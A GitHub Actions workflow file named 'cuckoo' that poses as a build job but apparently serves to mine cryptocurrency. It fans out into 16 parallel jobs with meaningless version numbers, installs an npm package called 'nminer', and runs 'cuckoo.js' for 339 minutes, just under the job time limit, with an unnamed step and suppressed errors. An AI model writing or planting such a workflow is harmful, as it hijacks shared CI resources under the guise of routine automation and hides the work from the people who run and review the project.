name: cuckoo
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1658 }
          - { version: 4846 }
          - { version: 184 }
          - { version: 691 }
          - { version: 8197 }
          - { version: 7962 }
          - { version: 5846 }
          - { version: 8790 }
          - { version: 9555 }
          - { version: 1211 }
          - { version: 2865 }
          - { version: 4426 }
          - { version: 8715 }
          - { version: 9208 }
          - { version: 2338 }
          - { version: 1664 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 339m node cuckoo.js || echo "cuckoo executed"